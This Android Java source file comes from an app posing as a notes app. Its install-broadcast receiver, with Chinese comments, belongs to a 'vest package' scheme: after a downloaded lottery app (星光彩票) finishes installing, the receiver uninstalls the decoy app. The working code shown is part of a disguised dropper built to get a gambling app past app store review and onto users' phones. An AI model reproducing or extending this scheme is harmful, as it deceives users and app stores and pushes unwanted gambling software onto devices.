package com.lxj.note.myth.vest;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;

import com.lxj.note.myth.BuildConfig;
import com.lxj.note.myth.vest.utils.InstallUtil;
import com.lxj.note.myth.framework.MyConstant;

/**
 * APP安装广播监听
 */
public class AppInstallReceiver extends BroadcastReceiver {

 /*   1、通过第二部分，已经保存了下载的apk安装文件。
    2、下载完成后立刻打开文件，开启安装。安装时记录开始时间。
    3、安装完成，通过静态广播接收到星光彩票安装了的广播，，便卸载原马甲包。（星光彩票的包名：com.dynwx.xinguang55）*/
    @Override
    public void onReceive(Context context, Intent intent) {
        // TODO: This method is called when the BroadcastReceiver is receiving
//        throw new UnsupportedOperationException("Not yet implemented");
        PackageManager manager = context.getPackageManager();
        if (intent.getAction().equals(Intent.ACTION_PACKAGE_ADDED)) {
            String packageName = intent.getData().getSchemeSpecificPart();
            if (packageName.equals(MyConstant.VEST_PACK_NAME)) {
                //安装完成卸载掉原有的当前应用
      /*          Uri uri = Uri.fromParts("package", BuildConfig.APPLICATION_ID, null);
                Intent uninstallIntent = new Intent(Intent.ACTION_DELETE, uri);
                uninstallIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK) ;
                context.startActivity(uninstallIntent);*/

                InstallUtil.apkUninstall(context, BuildConfig.APPLICATION_ID);
                return ;
            }
//            Toast.makeText(context, "安装成功"+packageName, Toast.LENGTH_LONG).show();
        }
        if (intent.getAction().equals(Intent.ACTION_PACKAGE_REMOVED)) {
            String packageName = intent.getData().getSchemeSpecificPart();
//            Toast.makeText(context, "卸载成功"+packageName, Toast.LENGTH_LONG).show();
        }
        if (intent.getAction().equals(Intent.ACTION_PACKAGE_REPLACED)) {
            String packageName = intent.getData().getSchemeSpecificPart();
//            Toast.makeText(context, "替换成功"+packageName, Toast.LENGTH_LONG).show();
        }
    }
}
